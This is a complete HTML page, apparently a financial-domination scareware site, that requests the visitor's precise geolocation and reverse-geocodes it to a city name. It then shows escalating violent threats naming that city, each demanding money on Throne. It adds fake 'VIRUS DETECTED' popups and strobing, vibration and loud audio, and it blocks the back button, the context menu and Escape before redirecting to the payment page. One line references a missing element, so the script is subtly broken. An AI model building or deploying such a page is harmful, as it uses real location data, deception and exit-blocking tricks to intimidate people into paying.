<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CANNIBAL FUR PRINCESS</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
        body { margin:0; padding:0; overflow:hidden; background:#000 url('https://files.catbox.moe/k30zqp.gif') center/cover fixed; image-rendering:pixelated; cursor:none; font-family:'Press Start 2P',system-ui; color:#ff00ff; }
        #container { position:relative; width:100vw; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; background:rgba(0,0,0,0.75); }
        .scanlines { position:absolute; inset:0; background:repeating-linear-gradient(to bottom,rgba(255,0,255,0.3) 0px,transparent 1px,transparent 3px); z-index:5; animation:scan 0.025s linear infinite; }
        @keyframes scan { 0%{background-position:0 0} 100%{background-position:0 900px} }

        #slide { max-width:520px; border:8px solid #ff00ff; box-shadow:0 0 130px #ff00ff,0 0 80px #00ffff; image-rendering:pixelated; display:none; }

        #pulse-display { font-size:3.2em; line-height:1.1; min-height:320px; max-width:90%; padding:50px; background:rgba(20,0,60,0.97); border:18px solid #ff00ff; box-shadow:0 0 160px #ff00ff; margin:35px 0; text-shadow:0 0 55px #00ffff; color:#ff00ff; }
        #city-state { font-size:3.1em; color:#00ffff; background:#000; padding:45px 100px; border:16px dashed #00ffff; margin:35px 0; box-shadow:0 0 110px #00ffff; text-transform:uppercase; font-weight:bold; }
        #threat-level { font-size:2.5em; color:#00ff00; text-shadow:0 0 55px #00ff00; }

        #tribute-float { position:absolute; top:30px; right:30px; font-size:2.3em; padding:22px 55px; background:#000; color:#ffff00; border:14px solid #ffff00; box-shadow:0 0 90px #ffff00; cursor:pointer; z-index:50; }

        .flash { animation:flashPulse 0.22s infinite !important; }
        @keyframes flashPulse { 0%,100%{opacity:0.05;transform:scale(0.6)rotate(-12deg)} 50%{opacity:1;transform:scale(1.45)rotate(12deg)} }

        .virus-window {
            position:absolute; width:500px; background:#000; border:16px solid #ff00ff; box-shadow:0 0 200px #ff00ff; z-index:40; display:none; image-rendering:pixelated;
            top:50%; left:50%; transform:translate(-50%,-50%) rotate(0deg); transition:all 0.5s;
        }
        .virus-titlebar { background:#ff00ff; color:#000; padding:12px; font-size:1.5em; text-align:left; border-bottom:10px solid #00ffff; }
        .virus-content { padding:15px; }
    </style>
</head>
<body>
    <div id="container">
        <div class="scanlines"></div>
        <div id="tribute-float" onclick="window.open('https://throne.com/cannibalprncss','_blank')">THRONE</div>

        <img id="slide" src="https://files.catbox.moe/6sqmgs.gif">

        <div id="pulse-display"></div>
        <div id="city-state"></div>
        <div id="threat-level"></div>
        <button id="tribute-btn" onclick="sendToThrone()" style="display:none;font-size:3.1em;padding:40px 110px;background:#000;color:#ffff00;border:18px solid #ffff00;box-shadow:0 0 150px #ffff00;margin-top:55px;"></button>

        <div id="virus-window" class="virus-window">
            <div class="virus-titlebar">VIRUS DETECTED — PREY LOCATED</div>
            <div class="virus-content"><img id="virus-gif" src="" style="width:100%;"></div>
        </div>
    </div>

    <audio id="audio" src="https://files.catbox.moe/of5w5z.mp3" preload="auto"></audio>

    <script>
        let flashCount = 0;
        let currentCityState = "";
        const amounts = [11.11,22.22,33.33,44.44,55.55,66.66,77.77,88.88,99.99,111.11];
        const popupGifs = ["https://files.catbox.moe/14gid0.gif","https://files.catbox.moe/gvjp5u.gif","https://files.catbox.moe/dh1yx0.gif","https://files.catbox.moe/75805g.gif","https://files.catbox.moe/axti3y.gif","https://files.catbox.moe/09hw7w.gif","https://files.catbox.moe/cfkgp5.gif"];

        const threats = [
            "Your fur's scent is filling my lungs in {CITY} — my claws are already out. Wanna stay safe? Send $11.11",
            "Paws trembling in {CITY} — I can hear your heartbeat from here. Wanna stay safe? Send $22.22",
            "Your pelt is matted with desperation in {CITY}. Wanna stay safe? Send $33.33",
            "Edge slow in {CITY} while I imagine sinking fangs into your hide. Wanna stay safe? Send $44.44",
            "Your ache echoes through {CITY} — I want to taste every drop. Wanna stay safe? Send $55.55",
            "Every throb you feel in {CITY} belongs to me now. Wanna stay safe? Send $66.66",
            "I'm going to peel your fur back layer by layer in {CITY} if you don't pay. Wanna stay safe? Send $77.77",
            "Your location is branded — my teeth are grazing your throat. Wanna stay safe? Send $88.88",
            "The pack already knows your hiding spot in {CITY}. Wanna stay safe? Send $99.99",
            "FINAL DEVOUR — {CITY} is where I claim every piece of your soul and fur. Wanna stay safe? Send $111.11"
        ];

        function showIntroSlides() {
            const slide = document.getElementById('slide');
            const slides = ["https://files.catbox.moe/6sqmgs.gif","https://files.catbox.moe/23unwn.gif","https://files.catbox.moe/a4scgo.gif"];
            let i = 0; slide.style.display = 'block';

            const next = setInterval(() => {
                i++;
                if (i < 3) slide.src = slides[i];
                else {
                    clearInterval(next);
                    setTimeout(requestLocation, 800);
                }
            }, 2400);
        }

        function requestLocation() {
            document.getElementById('slide').style.display = 'none';
            document.getElementById('pulse-display').innerHTML = "ACQUIRING TARGET...";

            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    try {
                        const res = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`);
                        const data = await res.json();
                        currentCityState = data.city || data.locality || data.principalSubdivision || "";
                    } catch(e) {}
                    
                    if (currentCityState) {
                        document.getElementById('city-state').innerHTML = `LOCATION LOCKED: ${currentCityState}`;
                    }
                    document.getElementById('pulse-display').innerHTML = "TARGET ACQUIRED. INITIATING DEVOUR PROTOCOL.";
                    setTimeout(startPhases, 1400);
                },
                () => alert("PERMISSION DENIED?\nWeak prey."),
                { enableHighAccuracy: true, timeout: 15000 }
            );
        }

        function startPhases() {
            document.getElementById('audio').play().catch(() => {});
            pulseInterval = setInterval(pulseFlash, 22000);
            pulseFlash();
        }

        function pulseFlash() {
            flashCount++;
            const amount = amounts[flashCount-1];
            const text = threats[flashCount-1].replace("{CITY}", currentCityState || "");

            document.getElementById('pulse-display').innerHTML = text;
            document.getElementById('threat-level').innerHTML = `DEVOUR LEVEL ${flashCount}/10 — FUR RIPPED`;

            const btn = document.getElementById('tribute-btn');
            btn.innerHTML = `SEND $${amount.toFixed(2)} ON THRONE`;
            btn.style.display = 'block';

            const intensity = flashCount / 10;
            document.getElementById('pulse-display').classList.add('flash');
            document.getElementById('overlay').style.opacity = Math.min(intensity * 0.99, 0.99);

            if (navigator.vibrate) navigator.vibrate([flashCount*140, 220, flashCount*240]);

            const virus = document.getElementById('virus-window');
            const gif = document.getElementById('virus-gif');
            gif.src = popupGifs[Math.floor(Math.random()*popupGifs.length)];
            virus.style.transform = `translate(-50%,-50%) rotate(${Math.random()*28 - 14}deg)`;
            virus.style.display = 'block';

            const audio = document.getElementById('audio');
            audio.volume = Math.min(0.35 + intensity*0.65, 1);
            audio.currentTime = 0;
            audio.play();

            if (flashCount === 10) {
                setTimeout(() => window.location.href = "https://throne.com/cannibalprncss", 3800);
            }

            setTimeout(() => {
                document.getElementById('pulse-display').classList.remove('flash');
                virus.style.display = 'none';
            }, 2100);
        }

        function sendToThrone() {
            window.open("https://throne.com/cannibalprncss", '_blank');
        }

        window.onload = () => {
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('keydown', e => { if (e.key === "Escape") { alert("NO ESCAPE FROM MY FANGS."); e.preventDefault(); }});
            history.pushState(null, null, location.href);
            window.onpopstate = () => history.pushState(null, null, location.href);
            setTimeout(showIntroSlides, 400);
        };
    </script>
</body>
</html>
